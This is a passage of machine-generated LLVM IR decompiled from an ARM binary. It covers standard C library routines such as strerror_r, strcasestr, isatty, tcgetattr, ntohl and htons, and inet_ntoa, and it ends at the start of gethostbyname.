  %v1_14214 = add i32 %v0_14208, 2
  store i32 %v1_14214, i32* @ip, align 4
  %v1_14218 = add i32 %v0_14210, 2
  store i32 %v1_14218, i32* @lr, align 4
  br i1 %v9_1420c, label %dec_label_pc_14220, label %dec_label_pc_14238

dec_label_pc_14220:                               ; preds = %bb54
  %v2_14220 = icmp eq i8 %v3_14200, 0
  br i1 %v2_14220, label %bb55, label %dec_label_pc_141f4

bb55:                                             ; preds = %dec_label_pc_14220
  store i32 %v6_14154, i32* @r5, align 4
  store i32 %v9_14154, i32* @r6, align 4
  ret i32 %v1_141e4

dec_label_pc_141f4:                               ; preds = %dec_label_pc_14220
  %v2_14228 = inttoptr i32 %v1_14218 to i8*
  %v3_14228 = load i8, i8* %v2_14228, align 1
  %v4_14228 = zext i8 %v3_14228 to i32
  %v2_1422c = inttoptr i32 %v1_14214 to i8*
  %v3_1422c = load i8, i8* %v2_1422c, align 1
  %v9_14230 = icmp eq i8 %v3_1422c, %v3_14228
  br i1 %v9_14230, label %dec_label_pc_141f8, label %dec_label_pc_14238

dec_label_pc_14238:                               ; preds = %dec_label_pc_141f4, %bb54, %dec_label_pc_141dc
  %v0_14238 = phi i32 [ %v4_141e0, %dec_label_pc_141dc ], [ %v4_14228, %dec_label_pc_141f4 ], [ %v4_14204, %bb54 ]
  %v2_14238 = icmp eq i32 %v0_14238, 0
  br i1 %v2_14238, label %dec_label_pc_14240, label %dec_label_pc_1419c

dec_label_pc_14240:                               ; preds = %dec_label_pc_14238
  store i32 %v6_14154, i32* @r5, align 4
  store i32 %v9_14154, i32* @r6, align 4
  ret i32 %v1_141e4

dec_label_pc_14244:                               ; preds = %dec_label_pc_14168, %dec_label_pc_141bc, %dec_label_pc_141a8
  store i32 %v6_14154, i32* @r5, align 4
  store i32 %v9_14154, i32* @r6, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v1_14218, { 0, 2, 1 }
  uselistorder i32 %v1_14214, { 1, 2, 0 }
  uselistorder i32 %v1_141e4, { 2, 1, 0 }
  uselistorder i8 %v3_141d0.pn, { 1, 0 }
  uselistorder i8* %v3_141d0.pn.in, { 1, 0 }
  uselistorder i32 %storemerge43, { 4, 2, 6, 1, 3, 0, 5 }
  uselistorder i8 %v3_141c4, { 1, 0 }
  uselistorder i32 %v1_141c4, { 0, 2, 3, 1 }
  uselistorder i32 %v1_14168, { 0, 2, 1 }
  uselistorder i8 %v3_14158, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v9_14154, { 4, 0, 1, 2, 3 }
  uselistorder i32 %v6_14154, { 4, 0, 1, 2, 3 }
  uselistorder label %dec_label_pc_14244, { 1, 2, 0 }
  uselistorder label %dec_label_pc_141f8, { 1, 0 }
  uselistorder label %dec_label_pc_141d8, { 1, 0 }
  uselistorder label %dec_label_pc_141d0, { 1, 0, 2 }
  uselistorder label %dec_label_pc_141a8, { 1, 0 }
  uselistorder label %dec_label_pc_141c8.preheader, { 1, 0 }
}

define i32 @__GI___glibc_strerror_r(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r1, align 4
  store i32 %arg1, i32* @r4, align 4
  %v0_14254 = call i32 @__xpg_strerror_r()
  %v0_14258 = load i32, i32* @r4, align 4
  ret i32 %v0_14258
}

define i32 @__xpg_strerror_r() local_unnamed_addr {
entry:
  %r7.global-to-local = alloca i32, align 4
  %stack_var_-25 = alloca i32, align 4
  %v3_14260 = load i32, i32* @r4, align 4
  %v0_14264 = load i32, i32* @r0, align 4
  %v0_14270 = load i32, i32* @r1, align 4
  store i32 %v0_14270, i32* @r8, align 4
  %v0_14274 = load i32, i32* @r2, align 4
  store i32 %v0_14274, i32* @r6, align 4
  %tmp = icmp ult i32 %v0_14264, 125
  br i1 %tmp, label %thread-pre-split.preheader, label %dec_label_pc_142ac

thread-pre-split.preheader:                       ; preds = %entry
  store i32 ptrtoint ([8 x i8]* @global_var_1ff78.1080 to i32), i32* @r5, align 4
  %v2_142943446 = icmp eq i32 %v0_14264, 0
  br i1 %v2_142943446, label %bb26, label %dec_label_pc_14288.lr.ph

dec_label_pc_14288:                               ; preds = %dec_label_pc_14288.lr.ph, %bb
  %v2_142a041 = phi i1 [ %v2_142a03849, %dec_label_pc_14288.lr.ph ], [ %v2_142a0, %bb ]
  %v1_142a440 = phi i32 [ %v0_14294.pr48, %dec_label_pc_14288.lr.ph ], [ %v2_14290, %bb ]
  %v0_1428c39 = phi i32 [ %v0_14298547, %dec_label_pc_14288.lr.ph ], [ %v1_1428c, %bb ]
  %v1_1428c = add i32 %v0_1428c39, 1
  store i32 %v1_1428c, i32* @r5, align 4
  br i1 %v2_142a041, label %bb, label %thread-pre-split.loopexit

bb:                                               ; preds = %dec_label_pc_14288
  %v2_14290 = add i32 %v1_142a440, -1
  %v2_14294 = icmp eq i32 %v2_14290, 0
  %v1_14298 = inttoptr i32 %v1_1428c to i8*
  %v2_14298 = load i8, i8* %v1_14298, align 1
  %v2_142a0 = icmp eq i8 %v2_14298, 0
  br i1 %v2_14294, label %dec_label_pc_142a0, label %dec_label_pc_14288

thread-pre-split.loopexit:                        ; preds = %dec_label_pc_14288
  %v1_1429835 = inttoptr i32 %v1_1428c to i8*
  %v2_1429836 = load i8, i8* %v1_1429835, align 1
  %v2_142a038 = icmp eq i8 %v2_1429836, 0
  br label %dec_label_pc_14288.lr.ph

dec_label_pc_14288.lr.ph:                         ; preds = %thread-pre-split.loopexit, %thread-pre-split.preheader
  %v2_142a03849 = phi i1 [ %v2_142a038, %thread-pre-split.loopexit ], [ false, %thread-pre-split.preheader ]
  %v0_14294.pr48 = phi i32 [ %v1_142a440, %thread-pre-split.loopexit ], [ %v0_14264, %thread-pre-split.preheader ]
  %v0_14298547 = phi i32 [ %v1_1428c, %thread-pre-split.loopexit ], [ ptrtoint ([8 x i8]* @global_var_1ff78.1080 to i32), %thread-pre-split.preheader ]
  br label %dec_label_pc_14288

dec_label_pc_142a0:                               ; preds = %bb
  br i1 %v2_142a0, label %dec_label_pc_142ac, label %bb26

bb26:                                             ; preds = %thread-pre-split.preheader, %dec_label_pc_142a0
  %v0_1428c.lcssa55 = phi i32 [ %v1_1428c, %dec_label_pc_142a0 ], [ ptrtoint ([8 x i8]* @global_var_1ff78.1080 to i32), %thread-pre-split.preheader ]
  store i32 0, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_142e0

dec_label_pc_142ac:                               ; preds = %dec_label_pc_142a0, %entry
  %v3_142b0 = ashr i32 %v0_14264, 31
  %v5_142c4 = bitcast i32* %stack_var_-25 to i8*
  %v6_142c4 = call i32 @_uintmaxtostr(i8* %v5_142c4, i32 %v0_14264, i32 %v3_142b0, i32 -10, i32 0)
  %v1_142c8 = add i32 %v6_142c4, -14
  store i32 %v1_142c8, i32* @r5, align 4
  store i32 %v1_142c8, i32* @r0, align 4
  store i32 ptrtoint ([15 x i8]* @global_var_1ff68.1082 to i32), i32* @r1, align 4
  store i32 14, i32* @r2, align 4
  %v0_142d8 = call i32 @memcpy()
  store i32 22, i32* %r7.global-to-local, align 4
  %v0_142e0.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_142e0

dec_label_pc_142e0:                               ; preds = %bb26, %dec_label_pc_142ac
  %v0_142e0 = phi i32 [ %v0_1428c.lcssa55, %bb26 ], [ %v0_142e0.pre, %dec_label_pc_142ac ]
  %v1_142e0 = inttoptr i32 %v0_142e0 to i8*
  %v3_142e4 = call i32 @strlen(i8* %v1_142e0)
  %v0_142e8 = load i32, i32* @r8, align 4
  %v2_142e8 = icmp eq i32 %v0_142e8, 0
  %v1_142ec = add i32 %v3_142e4, 1
  store i32 %v1_142ec, i32* @r4, align 4
  br i1 %v2_142e8, label %bb27, label %dec_label_pc_142e0._crit_edge

dec_label_pc_142e0._crit_edge:                    ; preds = %dec_label_pc_142e0
  %v1_142f4.pre = load i32, i32* @r6, align 4
  br label %bb28

bb27:                                             ; preds = %dec_label_pc_142e0
  br label %bb28

bb28:                                             ; preds = %dec_label_pc_142e0._crit_edge, %bb27
  %v4_142f8 = phi i32 [ %v1_142f4.pre, %dec_label_pc_142e0._crit_edge ], [ 0, %bb27 ]
  %tmp56 = icmp ugt i32 %v1_142ec, %v4_142f8
  br i1 %tmp56, label %bb29, label %.thread16

bb29:                                             ; preds = %bb28
  store i32 %v4_142f8, i32* @r4, align 4
  store i32 34, i32* %r7.global-to-local, align 4
  br label %.thread16

.thread16:                                        ; preds = %bb28, %bb29
  %v0_1430814 = phi i32 [ %v4_142f8, %bb29 ], [ %v1_142ec, %bb28 ]
  %v2_14300 = icmp eq i32 %v0_1430814, 0
  br i1 %v2_14300, label %dec_label_pc_14324, label %dec_label_pc_14308

dec_label_pc_14308:                               ; preds = %.thread16
  store i32 %v0_1430814, i32* @r2, align 4
  %v0_1430c = load i32, i32* @r5, align 4
  store i32 %v0_1430c, i32* @r1, align 4
  store i32 %v0_142e8, i32* @r0, align 4
  %v0_14314 = call i32 @memcpy()
  %v0_14318 = load i32, i32* @r8, align 4
  %v1_14318 = load i32, i32* @r4, align 4
  %v2_14318 = add i32 %v1_14318, %v0_14318
  %v3_14320 = add i32 %v2_14318, -1
  %v4_14320 = inttoptr i32 %v3_14320 to i8*
  store i8 0, i8* %v4_14320, align 1
  br label %dec_label_pc_14324

dec_label_pc_14324:                               ; preds = %.thread16, %dec_label_pc_14308
  %v0_14324 = load i32, i32* %r7.global-to-local, align 4
  %v2_14324 = icmp eq i32 %v0_14324, 0
  br i1 %v2_14324, label %dec_label_pc_14334, label %dec_label_pc_1432c

dec_label_pc_1432c:                               ; preds = %dec_label_pc_14324
  %v0_1432c = call i32 @__errno_location()
  %v0_14330 = load i32, i32* %r7.global-to-local, align 4
  %v2_14330 = inttoptr i32 %v0_1432c to i32*
  store i32 %v0_14330, i32* %v2_14330, align 4
  %v0_14334.pre = load i32, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_14334

dec_label_pc_14334:                               ; preds = %dec_label_pc_14324, %dec_label_pc_1432c
  %v0_14334 = phi i32 [ 0, %dec_label_pc_14324 ], [ %v0_14334.pre, %dec_label_pc_1432c ]
  store i32 %v3_14260, i32* @r4, align 4
  ret i32 %v0_14334

; uselistorder directives
  uselistorder i32 %v4_142f8, { 1, 2, 0 }
  uselistorder i32 %v1_142ec, { 1, 0, 2 }
  uselistorder i32 %v1_1428c, { 0, 1, 2, 3, 5, 4 }
  uselistorder i32 %v0_14264, { 4, 3, 1, 2, 0 }
  uselistorder i32* %r7.global-to-local, { 2, 3, 4, 0, 1, 5 }
  uselistorder label %dec_label_pc_14334, { 1, 0 }
  uselistorder label %dec_label_pc_14324, { 1, 0 }
  uselistorder label %.thread16, { 1, 0 }
  uselistorder label %bb28, { 1, 0 }
  uselistorder label %dec_label_pc_142e0, { 1, 0 }
  uselistorder label %bb26, { 1, 0 }
}

define i32 @strcasestr(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg1 to i32
  %v1_1435c16 = inttoptr i32 %arg2 to i8*
  br label %dec_label_pc_1435c.outer

dec_label_pc_1435c.outer:                         ; preds = %dec_label_pc_143c4, %entry
  %v0_14370.ph = phi i32 [ %v1_143c4, %dec_label_pc_143c4 ], [ %tmp, %entry ]
  %v2_1435c17 = load i8, i8* %v1_1435c16, align 1
  %v2_1436019 = icmp eq i8 %v2_1435c17, 0
  br i1 %v2_1436019, label %dec_label_pc_14370, label %dec_label_pc_14378

dec_label_pc_14370:                               ; preds = %dec_label_pc_1435c.backedge, %dec_label_pc_1435c.outer
  ret i32 %v0_14370.ph

dec_label_pc_14378:                               ; preds = %dec_label_pc_1435c.outer, %dec_label_pc_1435c.backedge
  %v1_1436825.in = phi i32 [ %v1_1436825, %dec_label_pc_1435c.backedge ], [ %arg2, %dec_label_pc_1435c.outer ]
  %v2_1435c23 = phi i8 [ %v2_1435c, %dec_label_pc_1435c.backedge ], [ %v2_1435c17, %dec_label_pc_1435c.outer ]
  %v2_1436424.in.in = phi i8 [ %v2_1435c, %dec_label_pc_1435c.backedge ], [ %v2_1435c17, %dec_label_pc_1435c.outer ]
  %v0_1438022 = phi i32 [ %v1_14380, %dec_label_pc_1435c.backedge ], [ %v0_14370.ph, %dec_label_pc_1435c.outer ]
  %v1_1436825 = add i32 %v1_1436825.in, 1
  %v1_14378 = inttoptr i32 %v0_1438022 to i8*
  %v2_14378 = load i8, i8* %v1_14378, align 1
  %v9_1437c = icmp eq i8 %v2_1435c23, %v2_14378
  %v1_14380 = add i32 %v0_1438022, 1
  br i1 %v9_1437c, label %dec_label_pc_1435c.backedge, label %dec_label_pc_1438c

dec_label_pc_1435c.backedge:                      ; preds = %dec_label_pc_14378, %dec_label_pc_1438c
  %v1_1435c = inttoptr i32 %v1_1436825 to i8*
  %v2_1435c = load i8, i8* %v1_1435c, align 1
  %v2_14360 = icmp eq i8 %v2_1435c, 0
  br i1 %v2_14360, label %dec_label_pc_14370, label %dec_label_pc_14378

dec_label_pc_1438c:                               ; preds = %dec_label_pc_14378
  %v2_1436424.in = zext i8 %v2_1436424.in.in to i32
  %v3_14378 = zext i8 %v2_14378 to i32
  %v2_14384 = mul nuw nsw i32 %v3_14378, 2
  %v2_1436424 = mul nuw nsw i32 %v2_1436424.in, 2
  %v2_14390 = load i32, i32* bitcast (i32** @global_var_298d0.1085 to i32*), align 4
  %v2_14394 = add i32 %v2_14390, %v2_14384
  %v2_14398 = add i32 %v2_14390, %v2_1436424
  %v1_1439c = add i32 %v2_14398, 1
  %v2_1439c = inttoptr i32 %v1_1439c to i8*
  %v3_1439c = load i8, i8* %v2_1439c, align 1
  %v4_1439c = zext i8 %v3_1439c to i32
  %v1_143a0 = add i32 %v2_14394, 1
  %v2_143a0 = inttoptr i32 %v1_143a0 to i8*
  %v3_143a0 = load i8, i8* %v2_143a0, align 1
  %v4_143a0 = zext i8 %v3_143a0 to i32
  %v3_143a4 = inttoptr i32 %v2_14394 to i8*
  %v4_143a4 = load i8, i8* %v3_143a4, align 1
  %v6_143a4 = zext i8 %v4_143a4 to i32
  %v3_143a8 = inttoptr i32 %v2_14398 to i8*
  %v4_143a8 = load i8, i8* %v3_143a8, align 1
  %v6_143a8 = zext i8 %v4_143a8 to i32
  %v3_143ac = mul nuw i32 %v4_1439c, 16777216
  %v3_143b0 = mul nuw i32 %v4_143a0, 16777216
  %v4_143b4 = sdiv i32 %v3_143ac, 65536
  %v5_143b4 = or i32 %v6_143a8, %v4_143b4
  %v4_143b8 = sdiv i32 %v3_143b0, 65536
  %v5_143b8 = or i32 %v4_143b8, %v6_143a4
  %v9_143bc = icmp eq i32 %v5_143b4, %v5_143b8
  br i1 %v9_143bc, label %dec_label_pc_1435c.backedge, label %dec_label_pc_143c4

dec_label_pc_143c4:                               ; preds = %dec_label_pc_1438c
  %v1_143c4 = add i32 %v0_14370.ph, 1
  %v2_143c8 = icmp eq i8 %v2_14378, 0
  br i1 %v2_143c8, label %dec_label_pc_143d8, label %dec_label_pc_1435c.outer

dec_label_pc_143d8:                               ; preds = %dec_label_pc_143c4
  ret i32 0

; uselistorder directives
  uselistorder i8 %v2_1435c, { 2, 1, 0 }
  uselistorder i8 %v2_14378, { 0, 2, 1 }
  uselistorder i32 %v0_1438022, { 1, 0 }
  uselistorder i32 %v0_14370.ph, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1435c.backedge, { 1, 0 }
  uselistorder label %dec_label_pc_14378, { 1, 0 }
}

define i32 @__GI_strtok(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  store i32 ptrtoint (i32* @global_var_2f934.1087 to i32), i32* @r2, align 4
  %v0_143e8 = call i32 @strtok_r()
  %v0_143ec = load i1, i1* @cpsr_z, align 1
  br i1 %v0_143ec, label %bb, label %bb1

bb:                                               ; preds = %entry
  %v1_143ec = load i32, i32* @r2, align 4
  %v2_143ec = load i32, i32* @r4, align 4
  %v3_143ec = load i32, i32* @sb, align 4
  %v8_143ec = lshr i32 %v2_143ec, %v3_143ec
  %v9_143ec = and i32 %v8_143ec, %v1_143ec
  call void @__pseudo_branch(i32 %v9_143ec)
  br label %bb1

bb1:                                              ; preds = %entry, %bb
  ret i32 %v0_143e8

; uselistorder directives
  uselistorder label %bb1, { 1, 0 }
}

define i32 @isatty(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-64 = alloca i32, align 4
  %v2_143f4 = ptrtoint i32* %stack_var_-64 to i32
  store i32 %v2_143f4, i32* @r1, align 4
  %v0_143fc = call i32 @__GI_tcgetattr()
  %v1_14400 = sub i32 1, %v0_143fc
  %v2_14400 = icmp ult i32 %v0_143fc, 2
  br i1 %v2_14400, label %bb4, label %bb

bb:                                               ; preds = %entry
  br label %bb4

bb4:                                              ; preds = %entry, %bb
  %v5_1440c = phi i32 [ %v1_14400, %entry ], [ 0, %bb ]
  ret i32 %v5_1440c

; uselistorder directives
  uselistorder i32 %v0_143fc, { 1, 0 }
  uselistorder label %bb4, { 1, 0 }
}

define i32 @__GI_tcgetattr() local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %tmp = call i8 @__decompiler_undefined_function_1()
  %stack_var_-39 = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %v3_14410 = load i32, i32* @r4, align 4
  %v6_14410 = load i32, i32* @r5, align 4
  %v2_14414 = ptrtoint i32* %stack_var_-56 to i32
  %v0_14418 = load i32, i32* @r1, align 4
  store i32 %v0_14418, i32* %r6.global-to-local, align 4
  %v0_14424 = load i32, i32* @r0, align 4
  %v3_14424 = call i32 @ioctl(i32 %v0_14424, i32 21505, i32 %v2_14414)
  store i32 %v3_14424, i32* %r7.global-to-local, align 4
  %v2_14428 = icmp eq i32 %v3_14424, 0
  %v2_14430 = ptrtoint i32* %stack_var_-39 to i32
  store i32 %v2_14430, i32* @r1, align 4
  %v0_14438 = load i32, i32* %r6.global-to-local, align 4
  br i1 %v2_14428, label %dec_label_pc_14440, label %dec_label_pc_1446c

dec_label_pc_14440:                               ; preds = %entry
  %v1_14438 = add i32 %v0_14438, 17
  %v4_14448 = zext i8 %tmp to i32
  store i32 %v4_14448, i32* @r5, align 4
  %v2_1444c = load i32, i32* %stack_var_-56, align 4
  %v1_14450 = inttoptr i32 %v0_14438 to i32*
  store i32 %v2_1444c, i32* %v1_14450, align 4
  %v3_14450 = add i32 %v0_14438, 4
  %v4_14450 = inttoptr i32 %v3_14450 to i32*
  %v5_14450 = load i32, i32* %ip.global-to-local, align 4
  store i32 %v5_14450, i32* %v4_14450, align 4
  %v6_14450 = add i32 %v0_14438, 8
  %v7_14450 = inttoptr i32 %v6_14450 to i32*
  %v8_14450 = load i32, i32* @lr, align 4
  store i32 %v8_14450, i32* %v7_14450, align 4
  %v0_14454 = load i32, i32* @r4, align 4
  %v1_14454 = load i32, i32* %r6.global-to-local, align 4
  %v2_14454 = add i32 %v1_14454, 12
  %v3_14454 = inttoptr i32 %v2_14454 to i32*
  store i32 %v0_14454, i32* %v3_14454, align 4
  %v0_14458 = load i32, i32* @r5, align 4
  %v1_14458 = trunc i32 %v0_14458 to i8
  %v2_14458 = load i32, i32* %r6.global-to-local, align 4
  %v3_14458 = add i32 %v2_14458, 16
  %v4_14458 = inttoptr i32 %v3_14458 to i8*
  store i8 %v1_14458, i8* %v4_14458, align 1
  %v4_1445c = call i32 @__GI_mempcpy(i32 %v1_14438, i32 %v2_14430, i32 19, i32 %v2_1444c)
  %v0_14460 = load i32, i32* %r7.global-to-local, align 4
  store i32 13, i32* @r2, align 4
  %v2_14468 = inttoptr i32 %v4_1445c to i8*
  %v3_14468 = call i32 @__GI_memset(i8* %v2_14468, i32 %v0_14460)
  br label %dec_label_pc_1446c

dec_label_pc_1446c:                               ; preds = %entry, %dec_label_pc_14440
  %v0_1446c = phi i32 [ %v3_14424, %entry ], [ %v0_14460, %dec_label_pc_14440 ]
  store i32 %v3_14410, i32* @r4, align 4
  store i32 %v6_14410, i32* @r5, align 4
  ret i32 %v0_1446c

; uselistorder directives
  uselistorder i32 %v0_14438, { 2, 1, 0, 3 }
  uselistorder i32 19, { 0, 3, 1, 2 }
  uselistorder i32 (i32, i32, i32)* @ioctl, { 0, 2, 1 }
  uselistorder label %dec_label_pc_1446c, { 1, 0 }
}

define i32 @ntohl(i32 %arg1) local_unnamed_addr {
entry:
  %v2_14498 = call i32 @llvm.bswap.i32(i32 %arg1)
  ret i32 %v2_14498
}

define i32 @ntohs(i32 %arg1) local_unnamed_addr {
entry:
  %tmp = mul i32 %arg1, 256
  %v1_144a8 = and i32 %tmp, 65280
  %tmp1 = udiv i32 %arg1, 256
  %v4_144ac = urem i32 %tmp1, 256
  %v5_144ac = or i32 %v4_144ac, %v1_144a8
  ret i32 %v5_144ac

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
}

define i32 @htonl(i32 %arg1) local_unnamed_addr {
entry:
  %v2_144d0 = call i32 @llvm.bswap.i32(i32 %arg1)
  ret i32 %v2_144d0
}

define i32 @htons(i32 %arg1) local_unnamed_addr {
entry:
  %tmp = mul i32 %arg1, 256
  %v1_144e0 = and i32 %tmp, 65280
  %tmp1 = udiv i32 %arg1, 256
  %v4_144e4 = urem i32 %tmp1, 256
  %v5_144e4 = or i32 %v4_144e4, %v1_144e0
  ret i32 %v5_144e4

; uselistorder directives
  uselistorder i32 65280, { 1, 2, 0, 3 }
  uselistorder i32 %arg1, { 1, 0 }
}

define i32 @hstrerror(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %tmp = icmp ult i32 %arg1, 5
  br i1 %tmp, label %bb, label %bb2

bb:                                               ; preds = %entry
  %v8_144f8 = mul i32 %arg1, 4
  %v9_144f8 = add i32 %v8_144f8, ptrtoint ([5 x i8*]* @global_var_20b48.1097 to i32)
  %v10_144f8 = inttoptr i32 %v9_144f8 to i32*
  %v11_144f8 = load i32, i32* %v10_144f8, align 4
  br label %bb2

bb2:                                              ; preds = %entry, %bb
  %v0_144fc = phi i32 [ ptrtoint ([15 x i8]* @global_var_20b5c.1090 to i32), %entry ], [ %v11_144f8, %bb ]
  ret i32 %v0_144fc

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %bb2, { 1, 0 }
}

define i32 @__GI_herror(i8* %arg1) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* @r4, align 4
  %v3_14510 = icmp eq i8* %arg1, null
  br i1 %v3_14510, label %dec_label_pc_1452c, label %dec_label_pc_1451c

dec_label_pc_1451c:                               ; preds = %entry
  %v2_1451c = load i8, i8* %arg1, align 1
  %v2_14520 = icmp eq i8 %v2_1451c, 0
  br i1 %v2_14520, label %dec_label_pc_1452c, label %dec_label_pc_14530

dec_label_pc_1452c:                               ; preds = %dec_label_pc_1451c, %entry
  br label %dec_label_pc_14530

dec_label_pc_14530:                               ; preds = %dec_label_pc_1451c, %dec_label_pc_1452c
  %storemerge = phi i32 [ ptrtoint (i32* @global_var_20b6e.1101 to i32), %dec_label_pc_1452c ], [ ptrtoint ([3 x i8]* @global_var_20b6c.1099 to i32), %dec_label_pc_1451c ]
  store i32 %storemerge, i32* @r5, align 4
  %v0_14530 = call i32 @__GI___h_errno_location()
  %v1_14534 = inttoptr i32 %v0_14530 to i32*
  %v2_14534 = load i32, i32* %v1_14534, align 4
  %tmp10 = icmp ult i32 %v2_14534, 5
  br i1 %tmp10, label %bb, label %bb9

bb:                                               ; preds = %dec_label_pc_14530
  %v8_14544 = mul i32 %v2_14534, 4
  %v9_14544 = add i32 %v8_14544, ptrtoint ([5 x i8*]* @global_var_20b48.1097 to i32)
  %v10_14544 = inttoptr i32 %v9_14544 to i32*
  %v11_14544 = load i32, i32* %v10_14544, align 4
  br label %bb9

bb9:                                              ; preds = %dec_label_pc_14530, %bb
  %storemerge3 = phi i32 [ %v11_14544, %bb ], [ ptrtoint ([15 x i8]* @global_var_20b5c.1090 to i32), %dec_label_pc_14530 ]
  %v0_1454c = load i32, i32* @r4, align 4
  %v2_14550 = load i32, i32* @global_var_295a8, align 4
  store i32 %v2_14550, i32* @r0, align 4
  %v0_14558 = load i32, i32* @r5, align 4
  %v9_14560 = call i32 @fprintf(i32 %v2_14550, i32 ptrtoint ([8 x i8]* @global_var_20ad4.1106 to i32), i32 %v0_1454c, i32 %v0_14558, i32 %storemerge3)
  ret i32 %v9_14560

; uselistorder directives
  uselistorder i32 %v2_14534, { 1, 0 }
  uselistorder i32 ptrtoint ([5 x i8*]* @global_var_20b48.1097 to i32), { 1, 0 }
  uselistorder label %bb9, { 1, 0 }
  uselistorder label %dec_label_pc_14530, { 1, 0 }
}

define i32 @__GI_inet_ntoa_r() local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %v3_14584 = load i32, i32* @r4, align 4
  %v6_14584 = load i32, i32* @r5, align 4
  %v9_14584 = load i32, i32* @r6, align 4
  %v0_14588 = load i32, i32* @r0, align 4
  %v2_145a8 = call i32 @llvm.bswap.i32(i32 %v0_14588)
  %v0_145ac = load i32, i32* @r1, align 4
  %v1_145ac = add i32 %v0_145ac, 15
  store i32 %v1_145ac, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_145d8

dec_label_pc_145b8:                               ; preds = %dec_label_pc_145d8
  %v1_145dc = urem i32 %v0_145ec, 256
  store i32 0, i32* %ip.global-to-local, align 4
  %v5_145c0 = inttoptr i32 %v0_145f8 to i8*
  %v6_145c0 = call i32 @_uintmaxtostr(i8* %v5_145c0, i32 %v1_145dc, i32 0, i32 -10, i32 0)
  %v0_145c4 = load i32, i32* @r6, align 4
  %v2_145c4 = icmp eq i32 %v0_145c4, 0
  %v1_145c8 = add i32 %v6_145c0, -1
  store i32 %v1_145c8, i32* %ip.global-to-local, align 4
  br i1 %v2_145c4, label %dec_label_pc_145d8.backedge, label %bb

dec_label_pc_145d8.backedge:                      ; preds = %bb, %dec_label_pc_145b8
  %storemerge.pre = phi i32 [ %storemerge.pre.pre, %bb ], [ %v1_145c8, %dec_label_pc_145b8 ]
  %v0_145d8.pre = load i32, i32* @r5, align 4
  %v0_145dc.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_145d8

bb:                                               ; preds = %dec_label_pc_145b8
  %v4_145d0 = inttoptr i32 %v0_145c4 to i8*
  store i8 46, i8* %v4_145d0, align 1
  %storemerge.pre.pre = load i32, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_145d8.backedge

dec_label_pc_145d8:                               ; preds = %dec_label_pc_145d8.backedge, %entry
  %v0_145f8 = phi i32 [ %v1_145ac, %entry ], [ %storemerge.pre, %dec_label_pc_145d8.backedge ]
  %storemerge = phi i32 [ 0, %entry ], [ %storemerge.pre, %dec_label_pc_145d8.backedge ]
  %v0_145ec = phi i32 [ %v2_145a8, %entry ], [ %v0_145dc.pre, %dec_label_pc_145d8.backedge ]
  %v0_145f0 = phi i32 [ 0, %entry ], [ %v0_145d8.pre, %dec_label_pc_145d8.backedge ]
  store i32 %storemerge, i32* @r6, align 4
  %v7_145d8 = icmp eq i32 %v0_145f0, 3
  store i1 %v7_145d8, i1* @cpsr_z, align 1
  %v3_145ec = udiv i32 %v0_145ec, 256
  store i32 %v3_145ec, i32* @r4, align 4
  %v1_145f0 = add i32 %v0_145f0, 1
  store i32 %v1_145f0, i32* @r5, align 4
  %v7_145f4 = icmp sgt i32 %v0_145f0, 3
  br i1 %v7_145f4, label %dec_label_pc_145f8, label %dec_label_pc_145b8

dec_label_pc_145f8:                               ; preds = %dec_label_pc_145d8
  %v1_145f8 = add i32 %v0_145f8, 1
  store i32 %v3_14584, i32* @r4, align 4
  store i32 %v6_14584, i32* @r5, align 4
  store i32 %v9_14584, i32* @r6, align 4
  ret i32 %v1_145f8

; uselistorder directives
  uselistorder i32 %v0_145f0, { 2, 0, 1 }
  uselistorder i32 (i8*, i32, i32, i32, i32)* @_uintmaxtostr, { 2, 0, 1 }
}

define i32 @__GI_inet_ntoa(i32 %arg1) local_unnamed_addr {
entry:
  store i32 ptrtoint (i32* @global_var_2f938.1108 to i32), i32* @r1, align 4
  %v0_14608 = call i32 @__GI_inet_ntoa_r()
  %v0_1460c = load i1, i1* @cpsr_z, align 1
  br i1 %v0_1460c, label %bb, label %bb1

bb:                                               ; preds = %entry
  %v2_1460c = load i32, i32* @r8, align 4
  %v3_1460c = load i32, i32* @sb, align 4
  %v8_1460c = lshr i32 %v2_1460c, %v3_1460c
  %v9_1460c = and i32 %v8_1460c, %arg1
  call void @__pseudo_branch(i32 %v9_1460c)
  br label %bb1

bb1:                                              ; preds = %entry, %bb
  ret i32 %v0_14608

; uselistorder directives
  uselistorder label %bb1, { 1, 0 }
}

define i32 @inet_addr(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-8 = alloca i32, align 4
  %v2_14614 = ptrtoint i32* %stack_var_-8 to i32
  %v0_1461c = load i32, i32* @r0, align 4
  %v2_1461c = inttoptr i32 %v0_1461c to i8*
  %v3_1461c = call i32 @inet_aton(i8* %v2_1461c, i32 %v2_14614)
  %v2_14620 = icmp eq i32 %v3_1461c, 0
  br i1 %v2_14620, label %bb4, label %bb

bb:                                               ; preds = %entry
  %v3_14628 = load i32, i32* %stack_var_-8, align 4
  br label %bb4

bb4:                                              ; preds = %entry, %bb
  %v5_14630 = phi i32 [ -1, %entry ], [ %v3_14628, %bb ]
  ret i32 %v5_14630

; uselistorder directives
  uselistorder label %bb4, { 1, 0 }
}

define i32 @__GI_gethostbyname(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-12 = alloca i32, align 4
